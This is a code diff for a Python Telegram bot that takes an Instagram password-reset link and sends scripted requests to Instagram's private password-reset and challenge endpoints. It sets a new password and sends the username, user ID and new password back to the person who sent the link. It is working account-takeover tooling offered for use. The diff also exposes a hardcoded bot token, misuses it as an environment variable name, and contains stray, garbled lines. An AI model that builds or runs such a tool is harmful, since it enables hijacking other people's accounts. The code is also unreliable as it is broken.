@@ -84,11 +84,9 @@ def extract_challenge_context(r2_text: str, cni: str) -> str:
     # Try to parse as JSON if the response is a JSON string
     try:
         data = json.loads(r2_text)
-        # Look for challenge_context in the structure (may be nested)
         if isinstance(data, dict):
             if "challenge_context" in data:
                 return data["challenge_context"]
-            # Some responses have it inside a "data" field
             if "data" in data and isinstance(data["data"], dict) and "challenge_context" in data["data"]:
                 return data["data"]["challenge_context"]
     except:
@@ -101,9 +99,7 @@ def extract_challenge_context(r2_text: str, cni: str) -> str:
 
     # Fallback: try to use the original splitting method (brittle)
     try:
-        # Remove escape characters
         clean = r2_text.replace('\\', '')
-        # Extract based on known pattern
         pattern = f'(bk.action.i64.Const, {cni}), "'
         if pattern in clean:
             part = clean.split(pattern)[1]
@@ -114,13 +110,143 @@ def extract_challenge_context(r2_text: str, cni: str) -> str:
 
     return None
 
-        "Send here a valid Instagram password reset link and I'll try to reset it ✌🏻.\n\n made by ~@ofstark"
+def reset_instagram_password(reset_link: str):
+    """
+    Attempt to reset Instagram password using a one-click login email link.
+    Returns dict with success status, username, new password, and user_id.
+    """
+    try:
+        parsed = urlparse(reset_link)
+        query_params = parse_qs(parsed.query)
+        fragment_params = parse_qs(parsed.fragment)
+        all_params = {**query_params, **fragment_params}
+
+        uidb36_list = all_params.get("uidb36") or all_params.get("uid")
+        token_list = all_params.get("token")
+
+        if not uidb36_list or not token_list:
+            return {"success": False, "error": "Missing uidb36/uid or token in the reset link."}
+
+        uidb36 = uidb36_list[0]
+        token = token_list[0].split(":")[0]
+
+        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
+
+        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
+        data = {
+            "source": "one_click_login_email",
+            "uidb36": uidb36,
+            "device_id": ANDROID_ID,
+            "token": token,
+            "waterfall_id": WATERFALL_ID
+        }
+
+        logger.info(f"Attempting password reset for uidb36: {uidb36}")
+        r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=15)
+
+        if r.status_code != 200:
+            return {"success": False, "error": f"Initial reset request failed with status {r.status_code}: {r.text[:300]}"}
+
+        logger.info(f"Password reset response: {r.text[:500]}")
+
+        if "user_id" not in r.text:
+            return {"success": False, "error": f"Initial reset request succeeded but no user_id in response: {r.text[:300]}"}
+
+        resp_json = r.json()
+        logger.debug(f"Parsed JSON: {resp_json}")
+
+        mid = r.headers.get("Ig-Set-X-Mid") or ""
+        user_id = resp_json.get("user_id")
+        if not user_id:
+            return {"success": False, "error": "user_id missing from reset response."}
+
+        cni = resp_json.get("cni")
+        nonce_code = resp_json.get("nonce_code")
+        challenge_context = resp_json.get("challenge_context")
+
+        if not cni and "challenge" in resp_json and isinstance(resp_json["challenge"], dict):
+            challenge = resp_json["challenge"]
+            cni = challenge.get("cni")
+            nonce_code = challenge.get("nonce_code")
+            challenge_context = challenge.get("challenge_context") or challenge.get("context")
+
+        if not cni and "navigation" in resp_json:
+            nav = resp_json.get("navigation", {})
+            if "data" in nav:
+                nav_data = nav.get("data", {})
+                cni = nav_data.get("cni")
+                nonce_code = nav_data.get("nonce_code")
+                challenge_context = nav_data.get("challenge_context")
+
+        if not all([user_id, cni, nonce_code]):
+            logger.error(f"Missing fields in response. user_id={user_id}, cni={cni}, nonce_code={nonce_code}")
+            logger.error(f"Full response: {resp_json}")
+            return {"success": False, "error": "Missing required fields (cni/nonce_code) in reset response."}
+
+        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
+        data2 = {
+            "user_id": str(user_id),
+            "cni": str(cni),
+            "nonce_code": str(nonce_code),
+            "bk_client_context": json.dumps({
+                "bloks_version": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+                "styles_id": "instagram"
+            }),
+            "challenge_context": str(challenge_context) if challenge_context else "",
+            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+            "get_challenge": "true"
+        }
+
+        r2 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=15)
+        r2_text = r2.text
+
+        challenge_context_final = extract_challenge_context(r2_text, cni)
+        if not challenge_context_final:
+            return {"success": False, "error": "Failed to extract final challenge context from Bloks response."}
+
+        data3 = {
+            "is_caa": "False",
+            "source": "",
+            "uidb36": "",
+            "error_state": json.dumps({"type_name": "str", "index": 0, "state_id": 1048583541}),
+            "afv": "",
+            "cni": str(cni),
+            "token": "",
+            "has_follow_up_screens": "0",
+            "bk_client_context": json.dumps({
+                "bloks_version": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+                "styles_id": "instagram"
+            }),
+            "challenge_context": challenge_context_final,
+            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+            "enc_new_password1": PASSWORD,
+            "enc_new_password2": PASSWORD
+        }
+
+        r3 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=15)
+
+        if r3.status_code not in (200, 204) and "ok" not in r3.text.lower():
+            logger.warning(f"Password submit returned: {r3.status_code} - {r3.text[:200]}")
+
+        new_password = PASSWORD.split(":")[-1]
+        username = get_username(user_id, USER_AGENT) or "Unknown"
+
+        return {
+            "success": True,
+            "username": username,
+            "password": new_password,
+            "user_id": user_id
+        }
+
+    except Exception as e:
+        logger.exception("Critical error in reset_instagram_password")
+        return {"success": False, "error": f"Unexpected error: {str(e)}"}
+
 # ========== Telegram Bot Handlers ==========
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "Welcome to STARK Instagram Password Reset Bot!\n\n"
-        "Send here a valid Instagram password reset link and I'll try to reset it ✌🏻.\n\n made by ~@ofstark"
+              "Send here a valid Instagram password reset link and I'll try to reset it ✌🏻.\n\n made by ~@ofstark"
     )
 
 async def handle_reset_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -135,7 +261,6 @@ async def handle_reset_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = reset_instagram_password(link)
 
     if result.get("success"):
-        # Escape special characters for MarkdownV2
         username_esc = escape_markdown_v2(result['username'])
         password_esc = escape_markdown_v2(result['password'])
         user_id_esc = escape_markdown_v2(str(result['user_id']))
@@ -161,16 +286,14 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text("⚠️ An internal error occurred. Please try again later.")
 
 def main():
-    TOKEN = "8714176831:AAEDT727dFmSyK4Mm49zp6-230FKs1Lxio8"
+    TOKEN = os.environ.get("8714176831:AAEDT727dFmSyK4Mm49zp6-230FKs1Lxio8")
 
     if not TOKEN:
         logger.error("TELEGRAM_BOT_TOKEN environment variable is not set!")
         return
 
-    # Build the application with the token
     application = Application.builder().token(TOKEN).build()
 
-    # Register handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_reset_link))
     application.add_error_handler(error_handler)
